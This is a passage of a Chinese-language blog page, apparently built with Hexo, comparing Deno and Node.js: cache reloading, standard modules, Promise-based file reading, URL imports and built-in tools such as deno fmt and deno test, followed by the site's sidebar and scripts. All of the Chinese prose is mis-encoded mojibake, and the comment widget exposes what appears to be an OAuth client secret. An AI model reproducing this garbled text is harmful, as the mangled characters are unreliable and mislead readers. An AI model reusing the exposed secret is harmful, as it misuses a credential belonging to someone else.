<p>è§£ï¼šå½“ä¾èµ–æ¨¡å—æ›´æ–°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ â€“reload è¿›è¡Œæ›´æ–°ç¼“å­˜ï¼Œä¾‹å¦‚ï¼š</p>
<p><code>&gt; deno run --reload index.js</code><br>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ç™½åå•çš„æ–¹å¼ï¼Œåªæ›´æ–°éƒ¨åˆ†ä¾èµ–ã€‚ä¾‹å¦‚ï¼š</p>
<p><code>&gt; deno run --reload=https://deno.land index.js</code></p>
<blockquote>
<p>5ã€ä»…ç¼“å­˜ä¾èµ–ï¼Œä¸æ‰§è¡Œä»£ç æœ‰åŠæ³•å—ï¼Ÿ</p>
</blockquote>
<p>è§£ï¼šæœ‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ deno cache index.js è¿›è¡Œä¾èµ–ç¼“å­˜ã€‚</p>
<blockquote>
<p>6ã€å¤šç‰ˆæœ¬æ€ä¹ˆå¤„ç†ï¼Ÿ</p>
</blockquote>
<p>è§£ï¼šæš‚æ—¶æ²¡æœ‰å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œåªèƒ½é€šè¿‡ git tag çš„æ–¹å¼åŒºåˆ†ç‰ˆæœ¬ã€‚</p>
<h2 id="7-æ ‡å‡†æ¨¡å—-ä¸-node-API-å…¼å®¹"><a href="#7-æ ‡å‡†æ¨¡å—-ä¸-node-API-å…¼å®¹" class="headerlink" title="7.æ ‡å‡†æ¨¡å— ä¸ node API å…¼å®¹"></a>7.æ ‡å‡†æ¨¡å— ä¸ node API å…¼å®¹</h2><p>æˆ‘ä»¬é€šè¿‡ç¬¬ 1 ç‚¹å¯ä»¥çœ‹åˆ°ï¼Œå…¶å® deno çš„ API ç›¸å¯¹äº node å…¶å®æ˜¯å°‘ä¸€äº›çš„ï¼Œé€šè¿‡å…¶æ–‡ä»¶å¤§å°ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼š</p>
<pre><code class="js">&gt; ll /usr/local/bin/node /Users/zhangchaojie/.local/bin/deno
-rwxr-xr-x  1   42M   /Users/zhangchaojie/.local/bin/deno
-rwxr-xr-x  1   70M   /usr/local/bin/node
</code></pre>
<p>é‚£è¿™äº›å°‘çš„ API åªèƒ½è‡ªå·±å†™æˆ–è€…æ±‚åŠ©äºç¤¾åŒºå—ï¼Ÿ</p>
<p>deno å¯¹äºè‡ªèº«ç›¸å¯¹äº node å°‘çš„å’Œç¤¾åŒºä¸­å¸¸ç”¨çš„åŠŸèƒ½ï¼Œæä¾›äº†æ ‡å‡†æ¨¡å—ï¼Œå…¶ç‰¹ç‚¹æ˜¯ä¸ä¾èµ–éæ ‡å‡†æ¨¡å—çš„å†…å®¹ï¼Œè¾¾åˆ°ç¤¾åŒºå†…çš„æ¨¡å—å¼•ç”¨æœ€åéƒ½æ”¶æ•›äºæ ‡å‡†æ¨¡å—çš„æ•ˆæœã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="js">// ç±»ä¼¼ node ä¸­ chalk åŒ…
import { bgRed, white } from &quot;https://deno.land/std/fmt/colors.ts&quot;;

// ç±»ä¼¼ node ä¸­çš„ uuid åŒ…
import { v4 } from &quot;https://deno.land/std/uuid/mod.ts&quot;;
</code></pre>
<p>åŒæ—¶ä¸ºäº†å¯¹ node ç”¨æˆ·å‹å¥½ï¼Œæä¾›äº† node API çš„å…¼å®¹</p>
<pre><code class="js">import * as path from &quot;https://deno.land/std/node/path.ts&quot;;
import * as fs from &quot;https://deno.land/std/node/fs.ts&quot;;

console.log(path.resolve(&#39;./&#39;, &#39;./test&#39;))
</code></pre>
<p>æ‰€ä»¥ï¼Œå¤§å®¶åœ¨ä¸º deno ç¤¾åŒºåšè´¡çŒ®çš„æ—¶å€™ï¼Œé¦–å…ˆè¦çœ‹ä¸€ä¸‹æ ‡å‡†æ¨¡å—æœ‰æ²¡æœ‰æä¾›ç±»ä¼¼çš„åŠŸèƒ½ï¼Œå¦‚æœå·²ç»æä¾›äº†å¯ä»¥è¿›è¡Œå¼•ç”¨ã€‚</p>
<h2 id="8-å¼‚æ­¥æ“ä½œ"><a href="#8-å¼‚æ­¥æ“ä½œ" class="headerlink" title="8.å¼‚æ­¥æ“ä½œ"></a>8.å¼‚æ­¥æ“ä½œ</h2><blockquote>
<p>æ ¹æ® ry è‡ªå·±æ˜¯è¯´æ³•ï¼Œåœ¨è®¾è®¡ node æ˜¯æœ‰äººæè®® Promise å¤„ç†å›è°ƒï¼Œä½†æ˜¯ä»–æ²¡å¬ï¼Œç”¨ä»–è‡ªå·±çš„è¯è¯´å°±æ˜¯æ„šè ¢çš„æ‹’ç»äº†ã€‚</p>
</blockquote>
<p><strong>node ç”¨å›è°ƒçš„æ–¹å¼å¤„ç†å¼‚æ­¥æ“ä½œã€deno åˆ™é€‰æ‹©ç”¨ Promise</strong></p>
<pre><code class="js">// node æ–¹å¼
const fs = require(&quot;fs&quot;);
fs.readFile(&quot;./data.txt&quot;, (err, data) =&gt; {
  if (err) throw err;
  console.log(data);
});
</code></pre>
<p>å¦å¤– deno æ”¯æŒ top-level-awaitï¼Œæ‰€ä»¥ä»¥ä¸Šè¯»å–æ–‡ä»¶çš„ä»£ç å¯ä»¥ä¸ºï¼š</p>
<pre><code class="js">// deno æ–¹å¼
const data = await Deno.readFile(&quot;./data.txt&quot;);
console.log(data);
</code></pre>
<p>node å…³äºè¿™æ–¹é¢ä¹Ÿåœ¨ä¸€ç›´æ”¹è¿›ï¼Œä¾‹å¦‚ç¤¾åŒºä¸Šå¾ˆå¤š <code>promisify</code> è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡åŒ…è£¹ä¸€å±‚å‡½æ•°ï¼Œå®ç°ç›®çš„ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="js">// node API promisify
const { promisify } = require(&quot;es6-promisify&quot;);
const fs = require(&quot;fs&quot;);

// æ²¡æœ‰ top-level-awaitï¼Œåªèƒ½åŒ…ä¸€å±‚
async function main() {
  const readFile = promisify(fs.readFile);
  const data = await readFile(&quot;./data.txt&quot;);
  console.log(data);
}

main();
</code></pre>
<h2 id="9-å•æ–‡ä»¶åˆ†å‘"><a href="#9-å•æ–‡ä»¶åˆ†å‘" class="headerlink" title="9.å•æ–‡ä»¶åˆ†å‘"></a>9.å•æ–‡ä»¶åˆ†å‘</h2><p>æˆ‘ä»¬çŸ¥é“ npm åŒ…å¿…é¡»æœ‰ <code>package.json</code> æ–‡ä»¶ï¼Œé‡Œé¢ä¸ä»…éœ€è¦æŒ‡æ˜ main æˆ– module æˆ– browser ç­‰å­—æ®µæ¥æ ‡æ˜å…¥å£æ–‡ä»¶ï¼Œè¿˜éœ€è¦æŒ‡æ˜ <code>name ã€license ã€description</code> ç­‰å­—æ®µæ¥è¯´æ˜è¿™ä¸ªåŒ…ã€‚</p>
<p>ry è§‰å¾—è¿™äº›å­—æ®µæ‰°ä¹±äº†å¼€å‘è€…çš„è§†å¬ï¼Œæ‰€ä»¥åœ¨ deno ä¸­ï¼Œå…¶æ¨¡å—ä¸éœ€è¦ä»»ä½•é…ç½®æ–‡ä»¶ï¼Œç›´æ¥æ˜¯ import url çš„å½¢å¼ã€‚</p>
<h2 id="10-å»ä¸­å¿ƒåŒ–ä»“åº“"><a href="#10-å»ä¸­å¿ƒåŒ–ä»“åº“" class="headerlink" title="10.å»ä¸­å¿ƒåŒ–ä»“åº“"></a>10.å»ä¸­å¿ƒåŒ–ä»“åº“</h2><p>å¯¹äº <code>www.npmjs.com</code> æˆ‘ä»¬è‚¯å®šéƒ½ä¸é™Œç”Ÿï¼Œå®ƒæ˜¯æ¨åŠ¨ node è“¬å‹ƒå‘å±•çš„é‡è¦æ”¯ç‚¹ã€‚ä½†ä½œè€…è®¤ä¸ºå®ƒæ˜¯ä¸­å¿ƒåŒ–ä»“åº“ï¼Œè¿èƒŒäº†äº’è”ç½‘å»ä¸­å¿ƒåŒ–åŸåˆ™ã€‚</p>
<p>æ‰€ä»¥ deno å¹¶æ²¡æœ‰ä¸€ä¸ªåƒ npmjs.com çš„ä»“åº“ï¼Œé€šè¿‡ import url çš„æ–¹å¼å°†äº’è”ç½‘ä»»ä½•ä¸€å¤„çš„ä»£ç éƒ½å¯ä»¥å¼•ç”¨ã€‚</p>
<p>PSï¼šdeno å…¶å®æ˜¯æœ‰ä¸ªåŸºäº <code>GitHub</code> çš„ç¬¬ä¸‰æ–¹æ¨¡å—é›†åˆã€‚</p>
<h2 id="11-å»å¼€å‘ä¾èµ–"><a href="#11-å»å¼€å‘ä¾èµ–" class="headerlink" title="11.å»å¼€å‘ä¾èµ–"></a>11.å»å¼€å‘ä¾èµ–</h2><p>æˆ‘ä»¬åœ¨å†™ä¸€ä¸ª node åº“æˆ–è€…å·¥å…·æ—¶ï¼Œå¼€å‘ä¾èµ–æ˜¯å°‘ä¸äº†çš„ï¼Œä¾‹å¦‚ babel åšè½¬åŒ–å’Œæ‰“åŒ…ã€jest åšæµ‹è¯•ã€prettier åšä»£ç æ ¼å¼åŒ–ã€eslint åšä»£ç æ ¼å¼æ ¡æ£€ã€gulp æˆ–è€… webpack åšæ„å»ºç­‰ç­‰ï¼Œè®©æˆ‘ä»¬åœ¨å¼€å‘å‰å°±æå¾—ç­‹ç–²åŠ›å°½ã€‚</p>
<blockquote>
<p>deno é€šè¿‡å†…ç½®äº†ä¸€äº›å·¥å…·ï¼Œè§£å†³ä¸Šè¿°é—®é¢˜ã€‚</p>
</blockquote>
<ul>
<li><p><code>deno bundle</code>ï¼šæ‰“åŒ…å‘½ä»¤ï¼Œç”¨æ¥æ›¿æ¢ babelã€gulp ä¸€ç±»å·¥å…·: ä¾‹å¦‚ï¼šdeno bundle ./mod.tsï¼›</p>
</li>
<li><p><code>deno fmt</code>ï¼šæ ¼å¼åŒ–å‘½ä»¤ï¼Œç”¨æ¥æ›¿æ¢ prettier ä¸€ç±»å·¥å…·ï¼Œä¾‹å¦‚ï¼šdeno fmt ./mod.tsï¼›</p>
</li>
<li><p><code>deno test</code>ï¼šè¿è¡Œæµ‹è¯•ä»£ç ï¼Œç”¨æ¥æ›¿æ¢ jest ä¸€ç±»å·¥å…·ï¼Œä¾‹å¦‚ deno test ./test.tsï¼›</p>
</li>
<li><p><code>deno lint</code>ï¼šä»£ç æ ¡æ£€ï¼ˆæš‚æœªå®ç°ï¼‰ï¼Œç”¨æ¥æ›¿æ¢ eslint ä¸€ç±»å·¥å…·ï¼Œä¾‹å¦‚ï¼šdeno lint ./mod.tsã€‚</p>
</li>
</ul>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>å°±åƒå°æ—¶å€™ä¸€ç›´å¹»æƒ³çš„ç‚¸å¼¹å§‹ç»ˆæ²¡èƒ½ç‚¸äº†å­¦æ ¡ï¼ŒæŠ€ï¼ˆè½®ï¼‰æœ¯ï¼ˆå­ï¼‰çš„è¿›ï¼ˆåˆ¶ï¼‰æ­¥ï¼ˆé€ ï¼‰ä¸€ç›´ä¹Ÿæœªåœæ­¢è¿‡ã€‚ä¸è®ºæˆ‘ä»¬å­¦çš„åŠ¨æˆ–è€…å­¦ä¸åŠ¨ï¼ŒæŠ€æœ¯å°±åœ¨é‚£é‡Œï¼Œä¸ä»¥äººçš„æ„å¿—ä¸ºè½¬ç§»ã€‚</p>
<p>è‡³äº deno èƒ½ä¸èƒ½ç«ï¼Œæˆ‘ä¸ªäººè§‰å¾—èµ·ç ä¸€ä¸¤å¹´å†…ä¸ä¼šæœ‰å¤ªå¤§åå“ï¼Œä¹‹åå’Œ node çš„å…³ç³»æœ‰å¯èƒ½åƒ Vue å’Œ reactï¼Œæœ‰äººå–œæ¬¢ç”¨ denoï¼Œè§‰å¾—æ¯” node å¥½ä¸€ä¸‡å€ï¼Œæœ‰äººåˆ™å–œæ¬¢ node ï¼Œè§‰å¾— node è¿˜èƒ½å†æˆ˜ 500 å¹´ã€‚è‡³äºæœ€ç»ˆå­¦ä¸å­¦è¿˜çœ‹è‡ªå·±ã€‚</p>
<p><a href="https://juejin.im/post/5ebcabb2e51d454da74185a9" target="_blank" rel="noopener">20 åˆ†é’Ÿå…¥é—¨ deno</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/statics/chengdu.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d='undefined'
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="/img/favicon.png" height=300 width=300></img>
                    <p>å¼ ç™½å‘Šä¸¶</p>
                    <span>Think like an artist, develop like an artisan</span>
                    <dl>
                        <dd><a href="https://github.com/zhanghao-web" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <!-- <dd><a href="" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd> -->
                    </dl>
                </div>
                <ul>
                    <li><a href="/">162 <p>Articles</p></a></li>
                    <li><a href="/categories">26 <p>Categories</p></a></li>
                    <li><a href="/tags">53 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Deno-VS-Node"><span class="toc-number">1.</span> <span class="toc-text">Deno VS Node</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-å†…ç½®-API-å¼•ç”¨æ–¹å¼ä¸åŒ"><span class="toc-number">1.1.</span> <span class="toc-text">1.å†…ç½® API å¼•ç”¨æ–¹å¼ä¸åŒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-æ¨¡å—ç³»ç»Ÿ"><span class="toc-number">1.2.</span> <span class="toc-text">2.æ¨¡å—ç³»ç»Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-å®‰å…¨"><span class="toc-number">1.3.</span> <span class="toc-text">3.å®‰å…¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-å…¼å®¹æµè§ˆå™¨-API"><span class="toc-number">1.4.</span> <span class="toc-text">4.å…¼å®¹æµè§ˆå™¨ API</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-æ”¯æŒ-Typescript"><span class="toc-number">1.5.</span> <span class="toc-text">5.æ”¯æŒ Typescript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-å»-node-modules"><span class="toc-number">1.6.</span> <span class="toc-text">6.å» node_modules</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-æ ‡å‡†æ¨¡å—-ä¸-node-API-å…¼å®¹"><span class="toc-number">1.7.</span> <span class="toc-text">7.æ ‡å‡†æ¨¡å— ä¸ node API å…¼å®¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-å¼‚æ­¥æ“ä½œ"><span class="toc-number">1.8.</span> <span class="toc-text">8.å¼‚æ­¥æ“ä½œ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-å•æ–‡ä»¶åˆ†å‘"><span class="toc-number">1.9.</span> <span class="toc-text">9.å•æ–‡ä»¶åˆ†å‘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-å»ä¸­å¿ƒåŒ–ä»“åº“"><span class="toc-number">1.10.</span> <span class="toc-text">10.å»ä¸­å¿ƒåŒ–ä»“åº“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-å»å¼€å‘ä¾èµ–"><span class="toc-number">1.11.</span> <span class="toc-text">11.å»å¼€å‘ä¾èµ–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#åè®°"><span class="toc-number">1.12.</span> <span class="toc-text">åè®°</span></a></li></ol></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>
    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2020
        <span class="gradient-text">
            å¼ ç™½å‘Šä¸¶
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    
<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">

    
<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>



<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/obsidian.js"></script>
<script src="/js/jquery.truncate.js"></script>
<script src="/js/search.js"></script>


<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>


<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>


<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>


<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>




    
<script src="/js/busuanzi.min.js"></script>

    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>



<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">


<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Think like an artist, develop like an artisan", "è‰ºæœ¯å®¶æ€ç»´å»æ€è€ƒé—®é¢˜ï¼Œå·¥åŒ åˆ›é€ ç²¾ç¥å»å¼€å‘"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
